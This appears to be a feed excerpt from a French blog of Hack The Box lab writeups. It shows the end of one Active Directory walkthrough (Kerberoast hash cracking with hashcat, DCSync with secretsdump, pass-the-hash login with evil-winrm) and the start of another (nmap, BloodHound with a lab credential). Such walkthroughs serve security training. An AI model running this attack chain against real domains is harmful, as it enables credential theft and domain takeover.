+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Hash&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Mode&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="mi">13100&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Kerberos&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">etype&lt;/span> &lt;span class="mi">23&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">TGS&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">REP&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Hash&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Target&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">krb5tgs&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">ethan&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">ADMINISTRATOR&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HTB&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="mf">.9&lt;/span>&lt;span class="nx">cb327&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Started&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="nx">Sat&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">19&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">39&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">25&lt;/span> &lt;span class="mi">2025&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="nx">secs&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Estimated&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Sat&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">19&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">39&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">25&lt;/span> &lt;span class="mi">2025&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="nx">secs&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Kernel&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Feature&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Pure&lt;/span> &lt;span class="nx">Kernel&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Guess&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Base&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">.:&lt;/span> &lt;span class="nf">File&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wordlists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rockyou&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Guess&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Queue&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">100.00&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Speed&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="mf">1.&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="mf">641.4&lt;/span> &lt;span class="nx">kH&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nf">s&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">0.52&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">@&lt;/span> &lt;span class="nx">Accel&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">256&lt;/span> &lt;span class="nx">Loops&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">Thr&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">Vec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">Recovered&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">100.00&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Digests&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">total&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">100.00&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Digests&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">new&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Progress&lt;/span>&lt;span class="o">.........&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">5120&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">14344385&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">0.04&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Rejected&lt;/span>&lt;span class="o">.........&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">5120&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">0.00&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Restore&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Point&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">.:&lt;/span> &lt;span class="mi">4608&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">14344385&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">0.03&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Restore&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Sub&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="mf">1.&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="nx">Salt&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="nx">Amplifier&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">Iteration&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Candidate&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Engine&lt;/span>&lt;span class="p">.:&lt;/span> &lt;span class="nx">Device&lt;/span> &lt;span class="nx">Generator&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Candidates&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="mf">1.&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Liverpool&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">babygrl&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Hardware&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Mon&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="mf">1.&lt;/span>&lt;span class="p">.:&lt;/span> &lt;span class="nx">Util&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">71&lt;/span>&lt;span class="o">%&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Started&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Sat&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">19&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">39&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">24&lt;/span> &lt;span class="mi">2025&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Stopped&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Sat&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">19&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">39&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">27&lt;/span> &lt;span class="mi">2025&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h3 id="dcsync">DCSync
+&lt;/h3>&lt;p>Puis, on peut effectuer un DCsync avec le mot de passe obtenu en utilisant &lt;code>secretsdump&lt;/code>.
+&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/EthantoDC.PNG"
+width="516"
+height="128"
+srcset="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/EthantoDC_hu_4bc5898d13305fe4.PNG 480w, https://01MI.github.io/p/administrator-htb-writeup-windows-medium/EthantoDC_hu_f19c3bbf4f50a37c.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="403"
+data-flex-basis="967px"
+>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
+&lt;/span>&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">secretsdump&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="sc">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="nx">ethan&lt;/span>&lt;span class="sc">&amp;#39;:&amp;#39;&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="sc">&amp;#39;@&amp;#39;&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">Administrator&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">&amp;gt;:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:::&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Cleaning&lt;/span> &lt;span class="nx">up&lt;/span>&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>On peut maintenant utiliser &lt;code>evil-winrm&lt;/code> pour se connecter au DC avec le NTHASH de l&amp;rsquo;admin.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">7
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">evil&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">winrm&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="mf">10.10.11.42&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">administrator&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">H&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nx">e&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">*&lt;/span>&lt;span class="nx">Evil&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">WinRM&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">PS&lt;/span> &lt;span class="nx">C&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Users&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Administrator&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Documents&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">cd&lt;/span> &lt;span class="p">..&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Desktop&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">*&lt;/span>&lt;span class="nx">Evil&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">WinRM&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">PS&lt;/span> &lt;span class="nx">C&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Users&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Administrator&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Desktop&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">dir&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Mode&lt;/span> &lt;span class="nx">LastWriteTime&lt;/span> &lt;span class="nx">Length&lt;/span> &lt;span class="nx">Name&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">----&lt;/span> &lt;span class="o">-------------&lt;/span> &lt;span class="o">------&lt;/span> &lt;span class="o">----&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">ar&lt;/span>&lt;span class="o">---&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2025&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">52&lt;/span> &lt;span class="nx">PM&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p></description></item><item><title>Certified - Windows Medium - HTB Writeup</title><link>https://01MI.github.io/fr/p/certified-htb-writeup-windows-medium/</link><pubDate>Sat, 15 Mar 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/fr/p/certified-htb-writeup-windows-medium/</guid><description>&lt;img src="https://01MI.github.io/p/certified-htb-writeup-windows-medium/Certified.PNG" alt="Featured image of post Certified - Windows Medium - HTB Writeup" />&lt;p>Ceci est mon premier writeup pour une box HTB.&lt;/p>
+&lt;h2 id="résumé">Résumé
+&lt;/h2>&lt;p>User: Abus d&amp;rsquo;ACL&lt;br>
+Root: Abus template ADCS&lt;/p>
+&lt;h2 id="enumeration">Enumeration
+&lt;/h2>&lt;p>A l&amp;rsquo;aide d&amp;rsquo;un scan nmap, nous pouvons identifier que cette machine est un contrôleur de domaine Active Directory.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">53&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">domain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">88&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">kerberos&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">sec&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">135&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">msrpc&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">139&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">netbios&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ssn&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">389&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ldap&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">445&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">microsoft&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ds&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">464&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">kpasswd5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">593&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">rpc&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">epmap&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">636&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ldapssl&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">3268&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">globalcatLDAP&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">3269&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">globalcatLDAPssl&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>Nous pouvons utiliser bloodhound-python avec le compte fourni &lt;em>judith.mader&lt;/em> afin de récupérer des informations concernant le domaine certified.htb.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">bloodhound&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">python&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">judith09&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">ns&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">d&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="nx">all&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="nx">AD&lt;/span> &lt;span class="nx">domain&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Getting&lt;/span> &lt;span class="nx">TGT&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">user&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">WARNING&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Failed&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">get&lt;/span> &lt;span class="nx">Kerberos&lt;/span> &lt;span class="nx">TGT&lt;/span>&lt;span class="p">.&lt;/span> &lt;span class="nx">Falling&lt;/span> &lt;span class="nx">back&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">NTLM&lt;/span> &lt;span class="nx">authentication&lt;/span>&lt;span class="p">.&lt;/span> &lt;span class="nx">Error&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Errno&lt;/span> &lt;span class="nx">Connection&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">dc01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">88&lt;/span>&lt;span class="p">)]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Errno&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Name&lt;/span> &lt;span class="nx">or&lt;/span> &lt;span class="nx">service&lt;/span> &lt;span class="nx">not&lt;/span> &lt;span class="nx">known&lt;/span>
